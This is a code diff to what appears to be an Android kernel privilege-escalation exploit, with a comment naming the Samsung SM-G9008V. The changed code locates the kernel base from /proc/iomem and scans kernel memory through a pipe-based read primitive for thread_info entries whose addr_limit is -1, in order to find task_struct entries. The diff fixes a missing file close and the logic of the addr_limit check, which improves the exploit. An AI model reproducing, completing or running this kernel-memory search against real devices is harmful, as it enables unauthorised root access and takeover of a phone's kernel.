@@ -14,7 +14,7 @@
 #define PF_KTHREAD	0x00200000	/* I am a kernel thread */
 
 static unsigned long const kernel_start = 0xFFFFFFC000080000;
-static unsigned long kernel_base = 0;
+static unsigned long kernel_search_start = 0;
 static int task_struct_comm_offset = 0;
 static int task_struct_tasks_offset = 0; // default is 0x1D0 for SM-G9008V
 static unsigned long kernel_task_struct = NULL;
@@ -69,7 +69,7 @@ static int read_iomem() {
 
 	iomem_file = fopen("/proc/iomem", "rt");
 	if(iomem_file == NULL) {
-		kernel_base = kernel_start;
+		kernel_search_start = kernel_start;
 		return 1;
 	}
 
@@ -90,15 +90,16 @@ static int read_iomem() {
 
 			if(strcasecmp(desc0, "Kernel") == 0 &&
 				(strcasecmp(desc1, "text") == 0 || strcasecmp(desc1, "code") == 0)) {
-				kernel_base = ((iomem_end+0x4000)&(~(0x4000UL-1))) - 0x80000000;
-				kernel_base += 0xFFFFFFC000000000;
-				printf("task search start address is 0x%016lX\n", (uint64_t)kernel_base);
+				kernel_search_start = ((iomem_end+0x4000)&(~(0x4000UL-1))) - 0x80000000;
+				kernel_search_start += 0xFFFFFFC000000000;
+				printf("task search start address is 0x%016lX\n", (uint64_t)kernel_search_start);
 				fclose(iomem_file);
 				return 0;
 			}
 		}
 	}
 
+	fclose(iomem_file);
 	return 1;
 }
 
@@ -255,7 +256,7 @@ int new_search_task64() {
 	int threadinfo_size = 0x4000;
 	int search_length = 0xC000000;
 	int i = 0;
-	unsigned long addr_limit = -1;
+	unsigned long addr_limit = 0;
 	unsigned long exec_domain = 0;
 
 	struct task_struct_first_partial *task_first = NULL;
@@ -264,11 +265,11 @@ int new_search_task64() {
 	void *stack = 0;
 
 	for(i=0; i<search_length; i+=threadinfo_size) {
-		ti = (void*)(i + kernel_base);
+		ti = (void*)(i + kernel_search_start);
 		if(0!=read_at_address_pipe(&ti->addr_limit, &addr_limit, sizeof(addr_limit))) {
 			continue;
 		}
-		if(-1UL==addr_limit) {
+		if(-1UL!=addr_limit) {
 			continue;
 		}
 		if(0!=read_at_address_pipe(&ti->exec_domain, &exec_domain, sizeof(exec_domain))) {
